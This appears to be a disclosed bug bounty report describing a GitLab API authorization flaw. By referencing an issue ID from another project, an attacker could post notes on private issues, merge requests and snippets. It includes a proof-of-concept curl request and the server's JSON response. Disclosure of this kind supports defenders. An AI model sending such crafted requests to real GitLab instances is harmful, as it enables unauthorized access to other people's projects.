@@ -1,0 +1,47 @@
+ReportLink:https://hackerone.com/reports/134299
+WeaknessName:Privilege Escalation
+Reporter:https://hackerone.com/jobert
+ReportedTo:GitLab(gitlab)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:03.05.2016 0:59:52
+
+Summary:
+
+# Vulnerability details
+By sending a specially crafted request to the GitLab API, an attacker can post notes on merge requests, snippets, and issues it doesn't have access to. This could execute additional note hooks that were configured by the project administrator.
+
+# Proof of concept
+As a victim, create a private project. Within this project, create an issue. For this proof of concept, lets state that the issue has ID 1. As an attacker, create a new project that you have access to. In this PoC, the project has ID 2. By referencing a `noteable_id` (polymorphic relation, can be a MR, snippet, or issue) that doesn't belong to a project the attacker has access to, notes can be created for objects that the attacker isn't authorized to access. Here's a cURL command that references project ID 2 and issue ID 1 (which actually belongs to project ID 1):
+
+```bash
+curl -X POST --header "PRIVATE-TOKEN: XXXXXXXXXXXX" "http://gitlab-instance/api/v3/projects/2/issues/1/notes" --data "body=@all%20please%20fix%20this."
+```
+
+The attacker's private token was used to send this request. It posts a note to the issue with ID 1. This method can also be used to give up and down votes. 
+
+```json
+{
+  "id":1,
+  "body":"@all please fix this.",
+  "attachment":null,
+  "author": {
+    "name":"John Doe",
+    "username":"john",
+    "id":4,
+    "state":"active",
+    "avatar_url":"http://www.gravatar.com/avatar/8ffb4b6252fa664afc7aeb9f48d1f196?s=80\u0026d=identicon",
+    "web_url":"http://gitlab-instance/u/john"
+  },
+  "created_at":"2016-04-24T23:40:08.112Z",
+  "system":false,
+  "noteable_id":1,
+  "noteable_type":"Issue",
+  "upvote":false,
+  "downvote":false
+}
+```
+
+# Impact
+This vulnerability can be used to scare people because it looks like the unauthorized user has access to the issue, snippet, or merge request. I've looked at the notification services to leak the title of the noteable object, but the ACL checks in that class seem to be okay (it doesn't do anything if the mentioned user doesn't have access to the project).
